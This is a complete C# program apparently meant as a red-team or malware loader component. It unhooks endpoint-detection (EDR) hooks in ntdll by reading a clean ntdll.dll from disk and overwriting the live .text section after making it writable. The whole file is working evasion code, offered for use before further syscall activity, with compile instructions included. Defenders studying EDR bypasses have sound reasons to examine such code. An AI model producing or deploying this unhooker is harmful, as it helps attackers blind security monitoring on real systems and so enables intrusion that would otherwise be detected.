// =============================================================================
// ntdll .text unhooking
//
// EDRs commonly hook ntdll functions by overwriting the first bytes of their
// in-memory implementations with a jmp to their own module. This loader reads a
// fresh, un-hooked copy of ntdll.dll from disk and overwrites the live .text
// section with the clean bytes, removing those userland hooks.
//
// Run this first (or inside a loader) before performing syscall/Nt* work so the
// Nt* wrappers are un-hooked.
//
// Compile (Release, x64):
//   csc /target:exe /platform:x64 /optimize+ /out:ntdll-unhook.exe ntdll-unhook.cs
// =============================================================================

using System;
using System.IO;
using System.Runtime.InteropServices;

namespace Unhooker
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        const uint PAGE_EXECUTE_READWRITE = 0x40;

        static void Main(string[] args)
        {
            // 1. Read a fresh ntdll.dll from disk
            byte[] fresh = File.ReadAllBytes(@"C:\Windows\System32\ntdll.dll");

            // 2. Locate the live ntdll base address
            IntPtr ntdllBase = GetModuleHandle("ntdll.dll");
            if (ntdllBase == IntPtr.Zero) { Console.WriteLine("[-] GetModuleHandle failed"); return; }

            // 3. Walk the PE headers to find the .text section
            int e_lfanew = BitConverter.ToInt32(fresh, 0x3C);
            int numSections = BitConverter.ToInt16(fresh, e_lfanew + 6);
            int sizeOptional = BitConverter.ToInt16(fresh, e_lfanew + 20);
            int sectionStart = e_lfanew + 24 + sizeOptional;

            IntPtr textAddr = IntPtr.Zero;
            int textVirtualSize = 0, textRawSize = 0, textRawOffset = 0;

            for (int i = 0; i < numSections; i++)
            {
                int off = sectionStart + (i * 40);
                string name = System.Text.Encoding.ASCII.GetString(fresh, off, 8).TrimEnd('\0');
                if (name == ".text")
                {
                    textVirtualSize = BitConverter.ToInt32(fresh, off + 8);   // VirtualSize
                    int textRva = BitConverter.ToInt32(fresh, off + 12);      // VirtualAddress
                    textRawSize = BitConverter.ToInt32(fresh, off + 16);      // SizeOfRawData
                    textRawOffset = BitConverter.ToInt32(fresh, off + 20);    // PointerToRawData
                    textAddr = (IntPtr)((long)ntdllBase + textRva);
                    break;
                }
            }

            if (textAddr == IntPtr.Zero) { Console.WriteLine("[-] .text section not found"); return; }

            // 4. Make the live .text writable
            uint oldProtect;
            int copySize = Math.Min(textVirtualSize, textRawSize);
            if (!VirtualProtect(textAddr, (UIntPtr)copySize, PAGE_EXECUTE_READWRITE, out oldProtect))
            { Console.WriteLine("[-] VirtualProtect failed: {0}", Marshal.GetLastWin32Error()); return; }

            // 5. Overwrite hooked bytes with the clean copy
            Marshal.Copy(fresh, textRawOffset, textAddr, copySize);

            // 6. Restore original protection
            VirtualProtect(textAddr, (UIntPtr)copySize, oldProtect, out oldProtect);

            Console.WriteLine("[+] ntdll .text unhooked ({0} bytes)", copySize);
        }
    }
}
